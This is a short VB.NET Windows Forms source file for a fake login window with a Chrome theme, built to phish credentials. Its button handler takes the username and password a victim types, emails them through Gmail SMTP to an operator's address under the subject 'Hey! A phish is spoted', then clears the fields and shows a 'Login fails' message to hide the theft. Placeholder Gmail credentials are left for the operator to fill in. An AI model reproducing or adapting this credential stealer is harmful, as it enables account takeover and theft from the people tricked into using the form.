Imports System.Net.Mail
Imports System.Net
Public Class Form1
    Private Sub ChromeButton1_Click(sender As Object, e As EventArgs) Handles ChromeButton1.Click
        'constructs object from mailMessage class
        Dim MyMailMessage As New MailMessage()

        Try
            'constructs a MailAddress object to store an email address to use
            Dim SendingAddress As MailAddress = New MailAddress("yourgmailid@gmail.com")

            'stores a mailaddress object which conatins an email
            'indicates message will be sent
            MyMailMessage.From = SendingAddress
            'adds new email to mymailmessage
            MyMailMessage.To.Add("yourgmailid@gmail.com")
            'MyMailMessage.To.Add("")
            'sets the subject of the email
            MyMailMessage.Subject = "Hey! A phish is spoted"
            'sets the body of the email
            MyMailMessage.Body = "Username: " & TextBox1.Text & "  Password: " & TextBox2.Text

            Dim MySMTP As New SmtpClient("smtp.gmail.com")

            'stores port number used by local smtp server
            MySMTP.Port = 587
            'server uses SSL to encrypt message, so enable must be set to true
            MySMTP.EnableSsl = True

            Dim MyCrediential As NetworkCredential = New NetworkCredential("yourgmailid@gmail.com", "yourgmailpassword") 'gmail is must
            MySMTP.Credentials = MyCrediential
            MySMTP.Send(MyMailMessage)

            TextBox1.Text = ""
            TextBox2.Text = ""
            TextBox1.Select()
        Catch ex As Exception
            MessageBox.Show("Login fails", "Error")
        End Try
    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click

    End Sub

    Private Sub ChromeThemeContainer1_Click(sender As Object, e As EventArgs) Handles ChromeThemeContainer1.Click

    End Sub
End Class
